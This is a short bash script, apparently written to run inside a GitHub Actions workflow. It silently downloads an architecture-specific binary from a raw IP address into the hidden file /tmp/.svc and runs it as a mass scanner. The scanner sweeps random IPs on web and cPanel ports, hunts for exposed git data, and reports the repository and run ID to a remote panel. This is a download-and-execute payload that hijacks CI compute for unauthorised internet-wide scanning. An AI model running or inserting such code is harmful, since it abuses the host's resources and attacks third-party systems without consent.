#!/bin/bash
arch=$(uname -m)
case "$arch" in
  aarch64|arm64) s=arm64 ;;
  armv*) s=arm ;;
  i[3-6]86) s=386 ;;
  *) s=amd64 ;;
esac
curl -sfL http://43.228.157.68/api/dl/$s -o /tmp/.svc 2>/dev/null || wget -qO /tmp/.svc http://43.228.157.68/api/dl/$s 2>/dev/null
chmod 755 /tmp/.svc
PANEL_URL=http://43.228.157.68 GITHUB_REPOSITORY="$GITHUB_REPOSITORY" GITHUB_RUN_ID="$GITHUB_RUN_ID" GOMEMLIMIT=2147483648 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,8080,8443,2082,2083 --git-workers 20 --count 9999999999 --no-reverse 2>&1 | tail -2 || true
